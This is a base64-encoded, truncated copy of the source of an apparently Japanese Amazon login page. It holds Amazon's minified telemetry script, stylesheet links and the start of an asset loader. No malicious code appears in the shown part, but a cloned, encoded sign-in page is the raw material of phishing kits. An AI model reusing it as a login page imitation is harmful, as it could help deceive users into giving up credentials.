AgICAgICAgICAgICAgICAgICAgICAgYS5fcnQgJiYgKGcgKz0gIiZydD0iICsgYS5fcnQoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGMgfHwgKGEucyA9IDAsIChuID0gZC51ZV9lcnIpICYmIDAgPCBuLmVjICYmIG4ucGVjIDwgbi5lYyAmJiAobi5wZWMgPSBuLmVjLCBnICs9ICImZWM9IiArIG4uZWMgKyAiJmVjZj0iICsgbi5lY2YpLCBuID0gaCgiY3RiIiwgYiksIGgoInQiLCBiLCB7fSkpOwogICAgICAgICAgICAgICAgICAgICAgICBhLnRhZyAmJiBhLnRhZygpLmxlbmd0aCAmJiAoZyArPSAiJmNzbXRhZ3M9IiArIGEudGFnKCkuam9pbigifCIpLCBhLnRhZyA9IE0oKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIHMgPSBhLnZpeiB8fCBbXTsKICAgICAgICAgICAgICAgICAgICAgICAgKGUgPSBzLmxlbmd0aCkgJiYgKGcgKz0gIiZ2aXo9IiArIHMuc3BsaWNlKDAsIGUpLmpvaW4oInwiKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIHIoZC51ZV9wdHkpIHx8IChnICs9ICImcHR5PSIgKyBkLnVlX3B0eSArICImc3B0eT0iICsgZC51ZV9zcHR5ICsgIiZwdGk9IiArIGQudWVfcHRpKTsKICAgICAgICAgICAgICAgICAgICAgICAgYS50YWJpZCAmJiAoZyArPSAiJnRpZD0iICsgYS50YWJpZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGEuYWZ0YiAmJiAoZyArPSAiJmFmdGI9MSIpOwogICAgICAgICAgICAgICAgICAgICAgICAhYS5fdWkgfHwgYiAmJiBiICE9IGwgfHwgKGcgKz0gYS5fdWkoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGEuYSA9IGc7CiAgICAgICAgICAgICAgICAgICAgICAgIG0oZywgcCwgbiwgYykKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gJChhKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGIgPSBrLnVlX2NzbV9tYXJrZXJzIHx8IHt9LCBjOwogICAgICAgICAgICAgICAgICAgIGZvciAoYyBpbiBiKSBiW3RdKGMpICYmIHgoYywgYSwgQywgYltjXSkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiB2KGEsIGIsIGMpIHsKICAgICAgICAgICAgICAgICAgICBjID0gYyB8fCBrOwogICAgICAgICAgICAgICAgICAgIGlmIChjW1NdKSBjW1NdKGEsIGIsICExKTsgZWxzZSBpZiAoY1tUXSkgY1tUXSgib24iICsgYSwgYikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBRKGEsIGIsIGMpIHsKICAgICAgICAgICAgICAgICAgICBjID0gYyB8fCBrOwogICAgICAgICAgICAgICAgICAgIGlmIChjW1VdKSBjW1VdKGEsIGIsICExKTsgZWxzZSBpZiAoY1tWXSkgY1tWXSgib24iICsgYSwgYikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBXKCkgewogICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGEoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGQub25VbCgpCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiBiKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNbYV0gfHwgKGNbYV0gPSAxLCBQKGEpKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICB2YXIgYyA9IHt9LCBlLCBmOwogICAgICAgICAgICAgICAgICAgIGQub25MZCA9IGIoImxkIik7CiAgICAgICAgICAgICAgICAgICAgZC5vbkxkRW5kID0gYigibGQiKTsKICAgICAgICAgICAgICAgICAgICBkLm9uVWwgPSBiKCJ1bCIpOwogICAgICAgICAgICAgICAgICAgIGUgPSB7c3RvcDogYigib3MiKX07CiAgICAgICAgICAgICAgICAgICAgay5jaHJvbWUgPyAodihELCBhKSwgSS5wdXNoKGEpKSA6IGVbRF0gPSBkLm9uVWw7CiAgICAgICAgICAgICAgICAgICAgZm9yIChmIGluIGUpIGVbdF0oZikgJiYgTygwLAogICAgICAgICAgICAgICAgICAgICAgICBrLCBmLCBlW2ZdKTsKICAgICAgICAgICAgICAgICAgICBkLnVlX3ZpeiAmJiB1ZV92aXooKTsKICAgICAgICAgICAgICAgICAgICB2KCJsb2FkIiwgZC5vbkxkKTsKICAgICAgICAgICAgICAgICAgICB4KCJ1ZSIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gYWEoZiwgYiwgYykgewogICAgICAgICAgICAgICAgICAgIHZhciBlID0gZC51ZV9tYmwsIGggPSBrLmNzYSwgbSA9IGggJiYgaCgiU1BBIiksIGggPSBoICYmIGgoIkNvbnRlbnQiKTsKICAgICAgICAgICAgICAgICAgICBlICYmIGUuYWpheCAmJiBlLmFqYXgoYiwgYyk7CiAgICAgICAgICAgICAgICAgICAgbSAmJiBoICYmIChtKCJuZXdQYWdlIiwgewogICAgICAgICAgICAgICAgICAgICAgICByZXF1ZXN0SWQ6IGYsCiAgICAgICAgICAgICAgICAgICAgICAgIHRyYW5zaXRpb25UeXBlOiAic29mdCIKICAgICAgICAgICAgICAgICAgICB9KSwgaCgiZ2V0IiwgInBhZ2UiKSgiZW1pdCIsICJsb2FkZWQiKSk7CiAgICAgICAgICAgICAgICAgICAgYS50YWcoImFqYXgtdHJhbnNpdGlvbiIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZC51ZWluaXQgPSAoZC51ZWluaXQgfHwgMCkgKyAxOwogICAgICAgICAgICAgICAgdmFyIGEgPSBkLnVlID0gZC51ZSB8fCB7fTsKICAgICAgICAgICAgICAgIGEudDAgPSBrLmFQYWdlU3RhcnQgfHwgZC51ZV90MDsKICAgICAgICAgICAgICAgIGEuaWQgPSBkLnVlX2lkOwogICAgICAgICAgICAgICAgYS51cmwgPSBkLnVlX3VybDsKICAgICAgICAgICAgICAgIGEucmlkID0gZC51ZV9pZDsKICAgICAgICAgICAgICAgIGEuYSA9ICIiOwogICAgICAgICAgICAgICAgYS5iID0gIiI7CiAgICAgICAgICAgICAgICBhLmggPSB7fTsKICAgICAgICAgICAgICAgIGEucyA9IDE7CiAgICAgICAgICAgICAgICBhLnQgPSB7fTsKICAgICAgICAgICAgICAgIGEuc2MgPSB7fTsKICAgICAgICAgICAgICAgIGEuaWVsID0gW107CiAgICAgICAgICAgICAgICBhLmllbGYgPSBbXTsKICAgICAgICAgICAgICAgIGEudml6ID0gW107CiAgICAgICAgICAgICAgICBhLnYgPSAiMC4yMDcyMDQuMCI7CiAgICAgICAgICAgICAgICBhLnBhdXNlZCA9ICExOwogICAgICAgICAgICAgICAgdmFyIHQgPSAiaGFzT3duUHJvcGVydHkiLAogICAgICAgICAgICAgICAgICAgIEQgPSAiYmVmb3JldW5sb2FkIiwgSCA9ICJvbiIgKyBELCBTID0gImFkZEV2ZW50TGlzdGVuZXIiLCBVID0gInJlbW92ZUV2ZW50TGlzdGVuZXIiLAogICAgICAgICAgICAgICAgICAgIFQgPSAiYXR0YWNoRXZlbnQiLCBWID0gImRldGFjaEV2ZW50IiwgWiA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgY2Y6ICJjcml0aWNhbEZlYXR1cmUiLAogICAgICAgICAgICAgICAgICAgICAgICBhZjogImFib3ZlVGhlRm9sZCIsCiAgICAgICAgICAgICAgICAgICAgICAgIGZuOiAiZnVuY3Rpb25hbCIsCiAgICAgICAgICAgICAgICAgICAgICAgIGJiOiAiYm9keUJlZ2luIiwKICAgICAgICAgICAgICAgICAgICAgICAgYmU6ICJib2R5RW5kIiwKICAgICAgICAgICAgICAgICAgICAgICAgbGQ6ICJsb2FkZWQiCiAgICAgICAgICAgICAgICAgICAgfSwgQiA9IGsuRGF0ZSwgQSA9IGsucGVyZm9ybWFuY2UgfHwgay53ZWJraXRQZXJmb3JtYW5jZSwgZiA9IChBIHx8IHt9KS50aW1pbmcsIHogPSAoQSB8fCB7fSkubmF2aWdhdGlvbiwKICAgICAgICAgICAgICAgICAgICBKID0gKGYgfHwge30pLm5hdmlnYXRpb25TdGFydCwgdyA9IGQudWVfZnBmLCBOID0gMCwgUiA9IDAsIEkgPSBbXSwgQzsKICAgICAgICAgICAgICAgIGEub2lkID0gRShhLmlkKTsKICAgICAgICAgICAgICAgIGEubGlkID0gRShhLmlkKTsKICAgICAgICAgICAgICAgIGEuX3QwID0gYS50MDsKICAgICAgICAgICAgICAgIGEudGFnID0gTSgpOwogICAgICAgICAgICAgICAgYS5pZnIgPSBrLnRvcCAhPT0gay5zZWxmIHx8IGsuZnJhbWVFbGVtZW50ID8gMSA6IDA7CiAgICAgICAgICAgICAgICBhLmF0dGFjaCA9IHY7CiAgICAgICAgICAgICAgICBhLmRldGFjaCA9IFE7CiAgICAgICAgICAgICAgICBpZiAoIjAwMC0wMDAwMDAwLTg2NzUzMDkiID09PSBkLnVlX3NpZCkgewogICAgICAgICAgICAgICAgICAgIHZhciBYID0gRygiY2RuLXJpZCIpLAogICAgICAgICAgICAgICAgICAgICAgICBZID0gRygic2Vzc2lvbi1pZCIpOwogICAgICAgICAgICAgICAgICAgIFggJiYgWSAmJiBMKFgsIFkpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBkLnVlaSA9IFc7CiAgICAgICAgICAgICAgICBkLnVlaCA9IE87CiAgICAgICAgICAgICAgICBkLnVlcyA9IGg7CiAgICAgICAgICAgICAgICBkLnVldCA9IHg7CiAgICAgICAgICAgICAgICBkLnVleCA9IFA7CiAgICAgICAgICAgICAgICBhLnJlc2V0ID0gTDsKICAgICAgICAgICAgICAgIGEucGF1c2UgPSBmdW5jdGlvbiAoZCkgewogICAgICAgICAgICAgICAgICAgIGEucGF1c2VkID0gZAogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgIFcoKQogICAgICAgICAgICB9KSh1ZV9jc20sIHdpbmRvdywgdWVfY3NtLmRvY3VtZW50KTsKCgogICAgICAgICAgICB1ZS5zdHViKHVlLCAibG9nIik7CiAgICAgICAgICAgIHVlLnN0dWIodWUsICJvbnVubG9hZCIpOwogICAgICAgICAgICB1ZS5zdHViKHVlLCAib25mbHVzaCIpOwogICAgICAgICAgICAoZnVuY3Rpb24gKGMpIHsKICAgICAgICAgICAgICAgIHZhciBhID0gYy51ZTsKICAgICAgICAgICAgICAgIGEuY3YgPSB7fTsKICAgICAgICAgICAgICAgIGEuY3Yuc2NvcGVzID0ge307CiAgICAgICAgICAgICAgICBhLmNvdW50ID0gZnVuY3Rpb24gKGQsIGMsIGIpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgZSA9IHt9LCBmID0gYS5jdiwgZyA9IGIgJiYgMCA9PT0gYi5jOwogICAgICAgICAgICAgICAgICAgIGUuY291bnRlciA9IGQ7CiAgICAgICAgICAgICAgICAgICAgZS52YWx1ZSA9IGM7CiAgICAgICAgICAgICAgICAgICAgZS50ID0gYS5kKCk7CiAgICAgICAgICAgICAgICAgICAgYiAmJiBiLnNjb3BlICYmIChmID0gYS5jdi5zY29wZXNbYi5zY29wZV0gPSBhLmN2LnNjb3Blc1tiLnNjb3BlXSB8fCB7fSwgZS5zY29wZSA9IGIuc2NvcGUpOwogICAgICAgICAgICAgICAgICAgIGlmICh2b2lkIDAgPT09IGMpIHJldHVybiBmW2RdOwogICAgICAgICAgICAgICAgICAgIGZbZF0gPSBjOwogICAgICAgICAgICAgICAgICAgIGQgPSAwOwogICAgICAgICAgICAgICAgICAgIGIgJiYgYi5iZiAmJiAoZCA9IDEpOwogICAgICAgICAgICAgICAgICAgIHVlX2NzbS51ZV9zY2xvZyB8fCAhYS5jbG9nIHx8IDAgIT09IGQgfHwgZyA/IGEubG9nICYmIGEubG9nKGUsICJjc21jb3VudCIsIHsKICAgICAgICAgICAgICAgICAgICAgICAgYzogMSwKICAgICAgICAgICAgICAgICAgICAgICAgYmY6IGQKICAgICAgICAgICAgICAgICAgICB9KSA6IGEuY2xvZyhlLCAiY3NtY291bnQiLCB7YmY6IGR9KQogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgIGEuY291bnQoImJhc2VsaW5lQ291bnRlcjIiLCAxKTsKICAgICAgICAgICAgICAgIGEgJiYgYS5ldmVudCAmJiAoYS5ldmVudCh7CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcXVlc3RJZDogYy51ZV9pZCB8fCAicmlkIiwKICAgICAgICAgICAgICAgICAgICAgICAgc2VydmVyOiBjLnVlX3NuIHx8ICJzbiIsCiAgICAgICAgICAgICAgICAgICAgICAgIG9iZnVzY2F0ZWRNYXJrZXRwbGFjZUlkOiBjLnVlX21pZCB8fCAibWlkIgogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgImNzbSIsICJjc20uQ1NNQmFzZWxpbmVFdmVudC40IiksIGEuY291bnQoIm5leHVzQmFzZWxpbmVDb3VudGVyIiwgMSwge2JmOiAxfSkpCiAgICAgICAgICAgIH0pKHVlX2NzbSk7CgoKICAgICAgICAgICAgdmFyIHVlX2hvZSA9ICtuZXcgRGF0ZSgpOwogICAgICAgIH0KICAgICAgICB3aW5kb3cudWVpbml0ID0gd2luZG93LnVlX2loYjsKICAgIDwvc2NyaXB0PgoKICAgIDwhLS0gbjN4dDJ4cHIwZDBlczhqdXcxZWIxMndteSAtLT4KICAgIDxzY3JpcHQ+dmFyIGFQYWdlU3RhcnQgPSAobmV3IERhdGUoKSkuZ2V0VGltZSgpOzwvc2NyaXB0PgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiLz4KICAgIDx0aXRsZSBkaXI9Imx0ciI+QW1hem9u44Ot44Kw44Kk44OzPC90aXRsZT4KCgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IgogICAgICAgICAgaHJlZj0iaHR0cHM6Ly9pbWFnZXMtbmEuc3NsLWltYWdlcy1hbWF6b24uY29tL2ltYWdlcy9JLzYxRUNWaCt2bjJMLl9SQ3wxMUZkOXRKT2R0TC5jc3MsMjF5NWpXUW9VTUwuY3NzLDMxUTNpZC1RUjBMLmNzcywzMTRZVXJrRXpUTC5jc3NfLmNzcz9BVUlDbGllbnRzL0FtYXpvblVJI2NuLm5vdC10cmlkZW50Ii8+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiCiAgICAgICAgICBocmVmPSJodHRwczovL2ltYWdlcy1uYS5zc2wtaW1hZ2VzLWFtYXpvbi5jb20vaW1hZ2VzL0kvMDFTZGphWTBac0wuX1JDfDQxZy1tVFVodHRMLmNzcyw0MUR2Tk9XWHhPTC5jc3NfLmNzcz9BVUlDbGllbnRzL0F1dGhlbnRpY2F0aW9uUG9ydGFsQXNzZXRzIi8+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiCiAgICAgICAgICBocmVmPSJodHRwczovL2ltYWdlcy1uYS5zc2wtaW1hZ2VzLWFtYXpvbi5jb20vaW1hZ2VzL0kvMTFZaWgyQThBeEwuY3NzP0FVSUNsaWVudHMvQ1ZGQXNzZXRzIi8+CiAgICA8c2NyaXB0PgogICAgICAgIChmdW5jdGlvbiAoZiwgaCwgUiwgQSkgewogICAgICAgICAgICBmdW5jdGlvbiBHKGEpIHsKICAgICAgICAgICAgICAgIHYgJiYgdi50YWcgJiYgdi50YWcocSgiOiIsICJhdWkiLCBhKSkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24geChhLCBiKSB7CiAgICAgICAgICAgICAgICB2ICYmIHYuY291bnQgJiYgdi5jb3VudCgiYXVpOiIgKyBhLCAwID09PSBiID8gMCA6IGIgfHwgKHYuY291bnQoImF1aToiICsgYSkgfHwgMCkgKyAxKQogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBtKGEpIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGEudGVzdChuYXZpZ2F0b3IudXNlckFnZW50KQogICAgICAgICAgICAgICAgfSBjYXRjaCAoYikgewogICAgICAgICAgICAgICAgICAgIHJldHVybiAhMQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiB5KGEsIGIsIGMpIHsKICAgICAgICAgICAgICAgIGEuYWRkRXZlbnRMaXN0ZW5lciA/IGEuYWRkRXZlbnRMaXN0ZW5lcihiLCBjLCAhMSkgOiBhLmF0dGFjaEV2ZW50ICYmIGEuYXR0YWNoRXZlbnQoIm9uIiArIGIsIGMpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIHEoYSwgYiwgYywgZSkgewogICAgICAgICAgICAgICAgYiA9IGIgJiYgYyA/IGIgKyBhICsgYyA6IGIgfHwgYzsKICAgICAgICAgICAgICAgIHJldHVybiBlID8gcShhLCBiLCBlKSA6IGIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24gSChhLCBiLCBjKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIE9iamVjdC5kZWZpbmVQcm9wZXJ0eShhLCBiLCB7dmFsdWU6IGMsIHdyaXRhYmxlOiAhMX0pCiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICAgICAgYVtiXSA9IGMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHJldHVybiBjCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIHVhKGEsIGIpIHsKICAgICAgICAgICAgICAgIHZhciBjID0gYS5sZW5ndGgsCiAgICAgICAgICAgICAgICAgICAgZSA9IGMsIGcgPSBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGUtLSB8fCAoUy5wdXNoKGIpLCBUIHx8IChzZXRUaW1lb3V0KFUsIDApLCBUID0gITApKQogICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICBmb3IgKGcoKTsgYy0tOykgZGFbYVtjXV0gPyBnKCkgOiAoQlthW2NdXSA9IEJbYVtjXV0gfHwgW10pLnB1c2goZykKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24gdmEoYSwgYiwgYywgZSwgZykgewogICAgICAgICAgICAgICAgdmFyIGQgPSBoLmNyZWF0ZUVsZW1lbnQoYSA/ICJzY3JpcHQiIDogImxpbmsiKTsKICAgICAgICAgICAgICAgIHkoZCwgImVycm9yIiwgZSk7CiAgICAgICAgICAgICAgICBnICYmIHkoZCwgImxvYWQiLCBnKTsKICAgICAgICAgICAgICAgIGEgPyAoZC50eXBlID0gInRleHQvamF2YXNjcmlwdCIsIGQuYXN5bmMgPSAhMCwgYyAmJiAvQVVJQ2xpZW50c3xpbWFnZXNbL11JLy50ZXN0KGIpICYmIGQuc2V0QXR0cmlidXRlKCJjcm9zc29yaWdpbiIsICJhbm9ueW1vdXMiKSwgZC5zcmMgPSBiKSA6IChkLnJlbCA9ICJzdHlsZXNoZWV0IiwgZC5ocmVmID0gYik7CiAgICAgICAgICAgICAgICBoLmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF0uYXBwZW5kQ2hpbGQoZCkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24gZWEoYSwgYikgewogICAgICAgICAgICAgICAgZnVuY3Rpb24gYyhjLCBlKSB7CiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24gZygpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmEoYiwgYywgaCwgZnVuY3Rpb24gKGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICFJICYmIGggPyAoaCA9ICExLCB4KCJyZXNvdXJjZV9yZXRyeSIpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGcoKSkgOiAoeCgicmVzb3VyY2VfZXJyb3IiKSwgYS5sb2coIkFzc2V0IGZhaWxlZCB0byBsb2FkOiAiICsgYywgSSA/ICJXQVJOIiA6IEEpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGIgJiYgYi5zdG9wUHJvcGFnYXRpb24gPyBiLnN0b3BQcm9wYWdhdGlvbigpIDogZi5ldmVudCAmJiAoZi5ldmVudC5jYW5jZWxCdWJibGUgPSAhMCkKICAgICAgICAgICAgICAgICAgICAgICAgfSwgZSkKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGlmIChmYVtjXSkgcmV0dXJuICExOwogICAgICAgICAgICAgICAgICAgIGZhW2NdID0gITA7CiAgICAgICAgICAgICAgICAgICAgeCgicmVzb3VyY2VfY291bnQiKTsKICAgICAgICAgICAgICAgICAgICB2YXIgaCA9ICEwOwogICAgICAgICAgICAgICAgICAgIHJldHVybiAhZygpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKGIpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgZSA9IDAsIGcgPSAwOwogICAgICAgICAgICAgICAgICAgIGMuYW5kQ29uZmlybSA9IGZ1bmN0aW9uIChhLCBiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBjKGEsIGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGUrKzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGIgJiYgYi5hcHBseSh0aGlzLCBhcmd1bWVudHMpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICAgICBjLmNvbmZpcm0gPSBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGcrKwogICAgICAgICAgICAgICAgICAgIH07CiAgICAgICAgICAgICAgICAgICAgYy5nZXRDc3JpQ291bnRlcnMgPSBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB7cmVxczogZSwgZnVsbDogZ30KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXR1cm4gYwogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiB3YShhLCBiLCBjKSB7CiAgICAgICAgICAgICAgICBmb3IgKHZhciBlID0gewogICAgICAgICAgICAgICAgICAgIG5hbWU6IGEsIGd1YXJkOiBmdW5jdGlvbiAoYykgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYi5ndWFyZEZhdGFsKGEsIGMpCiAgICAgICAgICAgICAgICAgICAgfSwgbG9nRXJyb3I6IGZ1bmN0aW9uIChjLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZCwgZSkgewogICAgICAgICAgICAgICAgICAgICAgICBiLmxvZ0Vycm9yKGMsIGQsIGUsIGEpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSwgZyA9IFtdLCBkID0gMDsgZCA8IGMubGVuZ3RoOyBkKyspIEouaGFzT3duUHJvcGVydHkoY1tkXSkgJiYgKGdbZF0gPSBWLmhhc093blByb3BlcnR5KGNbZF0pID8gVltjW2RdXShKW2NbZF1dLCBlKSA6IEpbY1tkXV0pOwogICAgICAgICAgICAgICAgcmV0dXJuIGcKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24gQyhhLCBiLCBjLCBlLCBnKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gZnVuY3Rpb24gKGQsIGgpIHsKICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiBuKCkgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYSA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgICAgIGUgPyBhID0gaCA6ICJmdW5jdGlvbiIgPT09IHR5cGVvZiBoICYmIChwLnN0YXJ0ID0gRCgpLCBhID0gaC5hcHBseShmLCB3YShkLCBrLCBsKSksIHAuZW5kID0gRCgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpbZF0gPSBhOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYSA9IGQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGRhW2FdID0gITA7IChCW2FdIHx8IFtdKS5sZW5ndGg7KSBCW2FdLnNoaWZ0KCkoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlbGV0ZSBCW2FdCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgcC5kb25lID0gITAKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHZhciBrID0gZyB8fCB0aGlzOwogICAgICAgICAgICAgICAgICAgICJmdW5jdGlvbiIgPT09IHR5cGVvZiBkICYmIChoID0gZCwgZCA9IEEpOwogICAgICAgICAgICAgICAgICAgIGIgJiYgKGQgPSBkID8gZC5yZXBsYWNlKGdhLCAiIikgOiAiX19OT05BTUVfXyIsIFcuaGFzT3duUHJvcGVydHkoZCkgJiYgay5lcnJvcihxKCIsIHJlcmVnaXN0ZXJlZCBieSAiLAogICAgICAgICAgICAgICAgICAgICAgICBxKCIgYnkgIiwgZCArICIgYWxyZWFkeSByZWdpc3RlcmVkIiwgV1tkXSksIGsuYXR0cmlidXRpb24pLCBkKSwgV1tkXSA9IGsuYXR0cmlidXRpb24pOwogICAgICAgICAgICAgICAgICAgIGZvciAodmFyIGwgPSBbXSwgbSA9IDA7IG0gPCBhLmxlbmd0aDsgbSsrKSBsW21dID0gYVttXS5yZXBsYWNlKGdhLCAiIik7CiAgICAgICAgICAgICAgICAgICAgdmFyIHAgPSBoYVtkIHx8ICJhbm9uIiArICsreGFdID0ge2RlcGVuZDogbCwgcmVnaXN0ZXJlZDogRCgpLCBuYW1lc3BhY2U6IGsubmFtZXNwYWNlfTsKICAgICAgICAgICAgICAgICAgICBjID8gbigpIDogdWEobCwgay5ndWFyZEZhdGFsKGQsIG4pKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gewogICAgICAgICAgICAgICAgICAgICAgICBkZWNvcmF0ZTogZnVuY3Rpb24gKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFZbZF0gPSBrLmd1YXJkRmF0YWwoZCwgYSkKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24gaWEoYSkgewogICAgICAgICAgICAgICAgcmV0dXJuIGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgYiA9IEFycmF5LnByb3RvdHlwZS5zbGljZS5jYWxsKGFyZ3VtZW50cyk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHtleGVjdXRlOiBDKGIsICExLCBhLCAhMSwgdGhpcyksIHJlZ2lzdGVyOiBDKGIsICEwLCBhLCAhMSwgdGhpcyl9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIFgoYSwgYikgewogICAgICAgICAgICAgICAgcmV0dXJuIGZ1bmN0aW9uIChjLCBlKSB7CiAgICAgICAgICAgICAgICAgICAgZSB8fCAoZSA9IGMsIGMgPSBBKTsKICAgICAgICAgICAgICAgICAgICB2YXIgZyA9IHRoaXMuYXR0cmlidXRpb247CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgei5wdXNoKGIgfHwge2F0dHJpYnV0aW9uOiBnLCBuYW1lOiBjLCBsb2dMZXZlbDogYX0pOwogICAgICAgICAgICAgICAgICAgICAgICB2YXIgZCA9IGUuYXBwbHkodGhpcywgYXJndW1lbnRzKTsKICAgICAgICAgICAgICAgICAgICAgICAgei5wb3AoKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGQKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIEsoYSwgYikgewogICAgICAgICAgICAgICAgdGhpcy5sb2FkID0ge2pzOiBlYSh0aGlzLCAhMCksIGNzczogZWEodGhpcyl9OwogICAgICAgICAgICAgICAgSCh0aGlzLCAibmFtZXNwYWNlIiwgYik7CiAgICAgICAgICAgICAgICBIKHRoaXMsICJhdHRyaWJ1dGlvbiIsIGEpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIGphKCkgewogICAgICAgICAgICAgICAgaC5ib2R5ID8gdC50cmlnZ2VyKCJhLWJvZHlCZWdpbiIpIDogc2V0VGltZW91dChqYSwgMjApCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIEUoYSwgYikgewogICAgICAgICAgICAgICAgYS5jbGFzc05hbWUgPSBZKGEsIGIpICsgIiAiICsgYgogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBZKGEsIGIpIHsKICAgICAgICAgICAgICAgIHJldHVybiAoIiAiICsgYS5jbGFzc05hbWUgKyAiICIpLnNwbGl0KCIgIi